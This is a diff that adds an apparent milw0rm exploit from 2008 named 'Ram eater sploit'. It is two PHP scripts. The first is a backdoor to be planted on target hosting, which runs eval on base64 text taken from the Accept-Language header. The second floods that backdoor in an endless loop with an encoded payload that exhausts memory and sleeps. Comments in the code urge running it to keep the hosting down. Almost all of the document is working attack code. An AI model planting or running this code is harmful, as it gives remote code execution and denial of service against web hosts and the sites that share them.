@@ -1,0 +1,79 @@
+There is some kind of issue in PHP
+we can run out memory even on SAFE_MODE
+script simply allocate maximum of memory
+and go to sleep for, let's say 9999999 seconds.
+sleep() pass 'max_execution_time' setting.
+
+<?php
+/* put this one on target hosting */
+if ( ! $data = @getenv('HTTP_ACCEPT_LANGUAGE'))
+    $data = $_SERVER['HTTP_ACCEPT_LANGUAGE'];
+if ( ! preg_match('#^[a-zA-Z0-9/+]*={0,2}$#', $data))
+    die('no propety data');
+eval(base64_decode($data));
+?>
+
+<?
+    /* run from another, or even the same hosting */
+    @ini_set('max_execution_time', 0);
+    @set_time_limit(0);
+    @ignore_user_abort(true);
+    
+    $url = ''; /* url to script above on target hosting */
+    $port = 80;
+    
+    $url = empty($_REQUEST['url']) ? $url : $_REQUEST['url'];
+    $port = abs(intval(empty($_REQUEST['port']) ? $url : $_REQUEST['port']));
+    
+    if ( ! function_exists('fsockopen'))
+        die('sorry, fsockopen() function disabled :/');
+    
+    ?><? if ( empty($url) OR empty($port)): ?>
+    Ram eater sploit<br />
+    <form action="" method="POST">
+    <input type="text" name="url" value="Url to script on target hosting" 
+onfocus="this.value='http://'" /><br />
+    <input type="text" name="url" value="Port" onfocus="this.value=80" /><br 
+/>
+    <input type="Submit" value="Run" />
+    </form>
+    <? exit;endif; ?><?
+    
+    if ( ! $purl = @parse_url($url))
+        die('sorry, parse_url() function disabled O_o');
+    if ( ! $hostIp = @gethostbyname($purl['host']))
+        die('sorry, gethostbyname() function disabled or no such host');
+    
+    $exploit = 
+'JG1MaW1pdD0nNTEyTSc7aW5pX3NldCgnbWVtb3J5X2xpbWl0JywkbUxpbWl0KTtpZighJG1MaW1'.
+               'pdCA9IGluaV9nZXQoJ21lbW9yeV9saW1pdCcpKSRtTGltaXQgPSAnMk0nOyRtTGltaXRJbktiID'.
+               '0gc3Vic3RyKCRtTGltaXQsIDEpKjEwMjQqMC44O2ZvcigkaT0wOyRpPCRtTGltaXRJbktiOyRpK'.
+               'yspJG0uPXN0cl9yZXBlYXQoJ20nLDEwMjQpO3NsZWVwKDk5OTk5OTk5KTs=';
+    
+    $sock = "GET {$purl['path']} HTTP/1.1\n";
+    $sock.= "User-Agent: Opera/9.63 (Windows NT 5.1; U; pl) Presto/2.1.1\n";
+    $sock.= "Host: {$purl['host']}\n";
+    $sock.= "Accept-Language: {$exploit}\n"; /* it will be no server LOG... 
+i hope... */
+    $sock.= "Connection: Close\n\n";
+    $slen = strlen($sock);
+    
+    while ( true ) {
+        if ( ! $fp = @fsockopen($hostIp, (int)$port, $_e, $__e)) {
+            echo "error on fsockopen() function {$_e} {$__e}\n\n";
+            @sleep(5);
+            continue;
+        }
+        if ( ! @fwrite($fp, $sock, $slen))
+            echo "sorry, can\'t write data to socket\n";
+        @usleep(300000); /* 300ms */
+        fclose($fp);
+        echo 'X'; /* output, how many times script loop */
+    }
+    /* keep this script running until target hosting die
+       or leave it running if you want keep hosting down all the time
+       enjoy and wear your sunglasses at night  :) 
+       best regards, gogulas. */
+?>
+
+# milw0rm.com [2008-05-27]
